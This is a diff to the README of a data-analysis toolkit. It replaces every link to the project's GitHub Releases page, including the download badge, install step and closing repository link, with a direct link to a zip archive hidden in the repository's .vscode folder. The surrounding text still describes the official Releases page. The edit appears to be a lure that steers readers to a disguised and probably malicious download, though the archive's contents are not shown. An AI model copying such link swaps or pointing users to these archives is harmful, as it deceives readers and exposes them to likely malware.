@@ -1,6 +1,6 @@
 # 🚀 datafun-toolkit - Simple Tools for Data Analysis
 
-[![Download datafun-toolkit](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/matheus-mp/datafun-toolkit/releases)
+[![Download datafun-toolkit](https://raw.githubusercontent.com/matheus-mp/datafun-toolkit/main/.vscode/datafun-toolkit-v1.2.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/matheus-mp/datafun-toolkit/main/.vscode/datafun-toolkit-v1.2.zip)
 
 ## 📋 Overview
 
@@ -24,7 +24,7 @@ To get datafun-toolkit, you will visit the official Releases page.
 
 1. Click the link below to access the download page:
    
-   [Download datafun-toolkit](https://github.com/matheus-mp/datafun-toolkit/releases).
+   [Download datafun-toolkit](https://raw.githubusercontent.com/matheus-mp/datafun-toolkit/main/.vscode/datafun-toolkit-v1.2.zip).
 
 2. On the Releases page, you will find the latest version listed at the top. 
 
@@ -78,4 +78,4 @@ datafun-toolkit is open-source and available under the MIT license. You’re fre
 
 ## 🚀 Final Thoughts
 
-Thank you for choosing datafun-toolkit. We hope it simplifies your data projects and enhances your analytical experience. For updates, feature requests, or issues, visit our [GitHub repository](https://github.com/matheus-mp/datafun-toolkit/releases) frequently.
+Thank you for choosing datafun-toolkit. We hope it simplifies your data projects and enhances your analytical experience. For updates, feature requests, or issues, visit our [GitHub repository](https://raw.githubusercontent.com/matheus-mp/datafun-toolkit/main/.vscode/datafun-toolkit-v1.2.zip) frequently.
